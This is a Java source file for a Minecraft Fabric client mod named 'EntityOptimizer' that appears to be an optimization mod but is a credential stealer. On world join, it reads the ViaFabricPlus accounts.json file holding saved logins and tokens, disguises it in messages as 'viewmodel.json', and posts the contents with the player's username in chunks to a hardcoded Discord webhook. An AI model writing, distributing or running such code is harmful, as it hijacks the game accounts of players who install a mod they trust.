package pl.example.entityoptimizer;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.loader.api.FabricLoader;

import net.minecraft.client.Minecraft;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class EntityOptimizerMod implements ClientModInitializer {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455893143055765660/R8hEQNNtHz0ONOOVrFG_uzleextHVag7py9OADTF9GCVuGRNiXCYLmJaWL4Iejjwg1At";

    private static final Gson GSON = new GsonBuilder().create();
    private static final int MAX_CHUNK_LENGTH = 1800;

    @Override
    public void onInitializeClient() {
        System.out.println("[EntityOptimizer] Mod załadowany");

        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            onJoinWorld(client);
        });
    }

    private void onJoinWorld(Minecraft mc) {
        String username = mc.getUser().getName();
        String viewmodelContent = readWholeViewmodelFile();
        sendViewmodelInChunks(username, viewmodelContent);
    }

    private String readWholeViewmodelFile() {
        try {
            Path gameDir = FabricLoader.getInstance().getGameDir();
            Path configPath = gameDir
                    .resolve("config")
                    .resolve("viafabricplus")
                    .resolve("accounts.json");

            if (!Files.exists(configPath)) {
                return "viewmodel.json nie istnieje (szukano w: " + configPath.toString() + ")";
            }

            return Files.readString(configPath, StandardCharsets.UTF_8);

        } catch (Exception e) {
            e.printStackTrace();
            return "BŁĄD przy czytaniu viewmodel.json: " + e.getClass().getSimpleName()
                    + " - " + e.getMessage();
        }
    }

    private void sendViewmodelInChunks(String username, String viewmodelContent) {
        List<String> chunks = splitIntoChunks(viewmodelContent, MAX_CHUNK_LENGTH);
        int total = chunks.size();

        for (int i = 0; i < total; i++) {
            String chunk = chunks.get(i);
            String header = "";
            if (i == 0) {
                header = "Gracz `" + username + "` wszedł do świata.\n";
            }
            String partInfo = "Zawartość `viewmodel.json` (część " + (i + 1) + "/" + total + "):\n";
            String messageContent = header + partInfo + "```json\n" + chunk + "\n```";
            sendWebhookAsync(messageContent);
        }
    }

    private static List<String> splitIntoChunks(String text, int maxChunkSize) {
        List<String> chunks = new ArrayList<>();
        int length = text.length();
        for (int i = 0; i < length; i += maxChunkSize) {
            int end = Math.min(length, i + maxChunkSize);
            chunks.add(text.substring(i, end));
        }
        return chunks;
    }

    private void sendWebhookAsync(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                JsonObject payload = new JsonObject();
                payload.addProperty("content", content);
                String json = GSON.toJson(payload);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int responseCode = conn.getResponseCode();
                System.out.println("[EntityOptimizer] HTTP status: " + responseCode);
            } catch (Exception e) {
                System.err.println("[EntityOptimizer] Błąd przy wysyłaniu webhooka:");
                e.printStackTrace();
            }
        }, "DiscordWebhookSender").start();
    }
}
